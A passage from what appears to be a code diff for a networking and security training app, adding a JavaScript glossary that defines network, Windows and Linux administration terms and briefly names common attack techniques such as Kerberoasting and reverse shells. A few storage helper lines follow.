setting that moves an edge port straight to forwarding, for ports with one end device."], ["RADIUS", "The server that answers 802.1X and VPN sign-in requests, assigns a VLAN, and logs each decision."], ["root", "The Linux superuser, UID 0, with full control of the system."], ["Root cause", "The underlying reason an incident could happen, such as an unpatched server, as opposed to its symptoms."], ["Router-on-a-stick", "One router port, split into subinterfaces, that routes between VLANs over a single trunk."], ["Scope", "The exact systems, accounts, methods, and time window that an authorization covers."], ["Script", "A text file of commands that an interpreter reads and runs. Read every line before you run one."], ["SSH", "Secure Shell, the encrypted remote-login service on TCP port 22."], ["Sticky MAC", "A MAC address that port security learns from traffic and writes into the running-config."], ["Subinterface", "A logical slice of a router port (such as g0/0.10) bound to one VLAN by encapsulation dot1Q."], ["Subnet mask", "The number that marks the network part of an address, such as 255.255.255.0 for /24."], ["sudo", "Runs one command as root after checking your own password and your rights in /etc/sudoers."], ["Traceroute", "A tool (tracert on Windows) that lists each router on a path by sending probes with a rising TTL and reading the time-exceeded replies."], ["Trunk", "A link that carries many VLANs, tagging each frame with its VLAN ID."], ["TTL", "A packet counter each router lowers by one, so a looping packet eventually dies."], ["ufw", "Uncomplicated Firewall: the front end that writes Linux packet-filter rules on Ubuntu and Mint."], ["VLAN", "A group of switch ports that forms its own broadcast domain, usually with its own IP subnet."], ["VTP", "VLAN Trunking Protocol, which copies VLAN lists between switches in server and client modes."], ["VTP transparent mode", "A VTP setting in which a switch keeps its own VLAN list and ignores VLAN changes advertised by other switches."]]};
+  const C={"key": "netdrills.trouble-tickets", "read": ["#review", "#ticket", "#end"], "gloss": [["Access port", "A switch port in one VLAN that passes untagged frames to one end device."], ["access-class", "The line command that filters which source addresses may open a session to the device itself."], ["APIPA", "A self-assigned 169.254.x.x address that a Windows host takes when its DHCP request goes unanswered."], ["AppArmor", "The mandatory access control on Ubuntu, Mint, and Debian that confines each profiled program to the files it needs, even when it runs as root."], ["ARP", "The protocol that finds the MAC address for an IPv4 address on the local network."], ["ARP spoofing", "Forged ARP replies that claim another host’s IP address, often the gateway’s, to put the sender on-path."], ["AS-REP roasting", "Cracking offline the reply a domain controller sends for an account set to skip Kerberos pre-authentication."], ["ASR rules (attack surface reduction)", "Defender rules that block risky behavior, such as Office starting child processes, in Audit, Block, or Warn mode."], ["Audit policy", "The Windows settings that decide which Success and Failure events go to the Security log."], ["Audit user ID (auid)", "The ID of the person who signed in, which auditd keeps on every process that person starts, even after su or sudo. Services have it unset, and cron jobs carry their owner’s ID."], ["auditd", "The Linux audit daemon that records the security events its rules ask for."], ["auth.log", "The Ubuntu and Mint log file for sign-ins, sudo, and SSH. Debian 12 and later keep the same lines in the systemd journal (journalctl -u ssh)."], ["Autostate", "The rule that keeps an SVI down until its VLAN exists and a port carrying it is up."], ["Backdoor", "A hidden way back into a system, such as a netcat listener, an extra SSH key, or a rogue user."], ["Backup", "An independent copy on separate media that survives the loss of the original and earns trust after a test restore."], ["Baseline", "A record of how a system looks before you change it: its users, services, ports, software, and settings."], ["BPDU", "The message switches exchange to run spanning tree."], ["BPDU guard", "A setting that err-disables an edge port the moment a BPDU arrives."], ["Broadcast address", "The last address of a subnet, with every host bit set to 1."], ["CDP", "Cisco Discovery Protocol, which announces a device’s model, IOS version, and addresses to its neighbors."], ["Command Prompt", "cmd.exe, the older Windows command line, where commands such as dir and del, and tools such as sc.exe, netsh, and reg, take their own options (such as /s or start= disabled) in place of PowerShell parameters."], ["Complain mode", "An AppArmor mode that logs what a profile would block (apparmor=\"ALLOWED\") and blocks nothing; enforce mode blocks."], ["Compliance", "Meeting the laws, standards, and contracts that apply to an organization, and proving it with evidence."], ["Cron", "The scheduler that runs commands on a minute, hour, day, month, and weekday pattern."], ["Default gateway", "The router a host sends traffic to when the destination sits on another network."], ["Default route", "The 0.0.0.0/0 route that catches every destination missing from the routing table."], ["DHCP", "The service that hands hosts an address, mask, gateway, and DNS server automatically."], ["DHCP snooping", "A switch feature that lets DHCP server replies in only on trusted ports."], ["DNS", "The service that turns names into IP addresses."], ["DNSSEC", "Signatures on DNS records that let a validating resolver prove an answer is the zone owner’s, unchanged."], ["Domain controller (DC)", "A Windows Server that holds Active Directory and checks domain sign-ins."], ["Duplex mismatch", "One end of a link sending and receiving at once (full duplex) while the other takes turns (half): the link stays up but slow, with collisions and CRC errors."], ["Dynamic ARP inspection", "A switch feature that checks ARP packets on untrusted ports against the DHCP snooping table to stop ARP poisoning."], ["Elevated prompt", "A PowerShell or Command Prompt window opened with Run as administrator, needed for commands that change the machine."], ["enable secret", "The IOS line that guards privileged mode with a hashed password; enable password keeps it in clear text."], ["Encapsulation", "Wrapping data from the layer above in each layer’s own header on the way down the stack."], ["Encoding", "Rewriting data in another alphabet, such as base64, which anyone can reverse without a key."], ["Err-disabled", "A port state in which the switch has shut the port for a violation until an admin removes the cause and cycles the port."], ["Event ID", "The number that identifies a kind of logged Windows event, such as 4624 for a successful sign-in."], ["Evidence", "The files, logs, and settings an investigation question depends on, kept unchanged until the question is answered."], ["Gateway of last resort", "The show ip route line that names the default route’s next hop."], ["gMSA (group managed service account)", "An AD service account whose long password Windows rotates automatically."], ["Hardening", "Shrinking a system’s attack surface by removing what is unneeded and securely configuring what remains."], ["Host route", "A /32 route that matches exactly one address."], ["HST (Hawaiʻi Standard Time)", "UTC−10 all year, without daylight saving time: add 10 hours for UTC."], ["HTTPS", "HTTP inside TLS on port 443: private and protected against tampering."], ["ICMP", "The IP helper protocol that carries error and test messages, such as ping."], ["Implicit deny", "The hidden last line of every ACL that drops every packet no earlier line matched."], ["Incident", "An event, or a set of events, that harms or truly threatens confidentiality, integrity, or availability; often an alert that evidence confirms."], ["Indicator of compromise (IOC)", "A clue an attack leaves, such as an address, a file hash, a domain, or an account name, recorded with when and where it was found."], ["JSON", "A data format of braces, brackets, and quoted keys, used in API answers, cloud policies, and audit events."], ["Kerberoasting", "Requesting service tickets for user accounts with SPNs and cracking their passwords offline."], ["Kerberos", "The ticket-based sign-in protocol Active Directory uses by default."], ["Key pair", "A public key anyone may hold and a matching private key only its owner keeps."], ["LAN", "Local area network: devices in one building or campus, joined by links the owner controls."], ["Local account", "An account stored on one computer and usable only there."], ["Logon type", "The number in a Windows sign-in event that says how the sign-in happened: 2 at the keyboard, 3 over the network, and 10 by Remote Desktop."], ["Loop", "Code that repeats the same lines for each item, such as each line of a file."], ["MAC address", "A 48-bit hardware address that carries a frame to the next device on the local link."], ["NAT", "Address translation that swaps a private source address for a public one at the network edge."], ["Native VLAN", "The one VLAN that crosses a trunk untagged; both ends must agree on it."], ["Network address", "The first address of a subnet, with every host bit set to 0."], ["NTLM", "The older Windows challenge-response sign-in family (LM, NTLMv1, and NTLMv2), used when Kerberos is unavailable."], ["NTP", "The protocol that synchronizes device clocks so logs line up."], ["O E2", "An OSPF external type 2 route, whose cost stays at its starting metric (20 by default)."], ["On-path attack", "An attack that puts a stranger between two parties to read or change what passes; once called man-in-the-middle."], ["OSPF", "A link-state routing protocol in which neighbors share routes inside areas; area 0 is the backbone."], ["Password spraying", "Trying one or two common passwords on many accounts, to stay under each account’s lockout limit."], ["Persistence", "Any way malware arranges for the system to start it again after a reboot or sign-in, such as a service, scheduled task, or Run key."], ["Port security", "A switch feature that limits which, and how many, MAC addresses may use an access port."], ["PortFast", "A setting that moves an edge port straight to forwarding, for ports with one end device."], ["RADIUS", "The server that answers 802.1X and VPN sign-in requests, assigns a VLAN, and logs each decision."], ["RDP (Remote Desktop Protocol)", "The Windows remote sign-in service, listening on TCP 3389."], ["Reverse shell", "A backdoor that connects out from the victim to the attacker and hands over a shell."], ["root", "The Linux superuser, UID 0, with full control of the system."], ["Root cause", "The underlying reason an incident could happen, such as an unpatched server, as opposed to its symptoms."], ["Router-on-a-stick", "One router port, split into subinterfaces, that routes between VLANs over a single trunk."], ["Scheduled task", "A job Task Scheduler runs on a trigger, such as a time, a sign-in, or startup."], ["Scope", "The exact systems, accounts, methods, and time window that an authorization covers."], ["Script", "A text file of commands that an interpreter reads and runs. Read every line before you run one."], ["SIEM (security information and event management)", "A system that gathers logs from many sources, normalizes them, links related events, and raises alerts."], ["SSH", "Secure Shell, the encrypted remote-login service on TCP port 22."], ["Sticky MAC", "A MAC address that port security learns from traffic and writes into the running-config."], ["Subinterface", "A logical slice of a router port (such as g0/0.10) bound to one VLAN by encapsulation dot1Q."], ["Subnet mask", "The number that marks the network part of an address, such as 255.255.255.0 for /24."], ["SubStatus (event 4625)", "The code in a failed sign-in event that gives the exact reason: 0xC000006A a real account with a wrong password, and 0xC0000064 no such user."], ["sudo", "Runs one command as root after checking your own password and your rights in /etc/sudoers."], ["Syslog severity", "A number from 0 (emergency) to 7 (debug) on every syslog message; the lower the number, the more urgent."], ["systemd unit", "A file that tells systemd how to start a service, socket, or timer."], ["Traceroute", "A tool (tracert on Windows) that lists each router on a path by sending probes with a rising TTL and reading the time-exceeded replies."], ["Trunk", "A link that carries many VLANs, tagging each frame with its VLAN ID."], ["TTL", "A packet counter each router lowers by one, so a looping packet eventually dies."], ["ufw", "Uncomplicated Firewall: the front end that writes Linux packet-filter rules on Ubuntu and Mint."], ["UTC (Coordinated Universal Time)", "The one reference clock logs are converted to, so events from many devices line up in true order."], ["VLAN", "A group of switch ports that forms its own broadcast domain, usually with its own IP subnet."], ["VTP", "VLAN Trunking Protocol, which copies VLAN lists between switches in server and client modes."], ["VTP transparent mode", "A VTP setting in which a switch keeps its own VLAN list and ignores VLAN changes advertised by other switches."], ["Windows LAPS", "Built-in Windows feature that gives each machine its own random local admin password, rotates it, and stores it in AD or Entra ID."]]};
   const $=s=>document.querySelector(s);
   const lsGet=k=>{try{return localStorage.getItem(k);}catch(e){return null;}};
   const lsSet=(k,v)=>{try{localStorage.setItem(k,v);}catch(e){}};
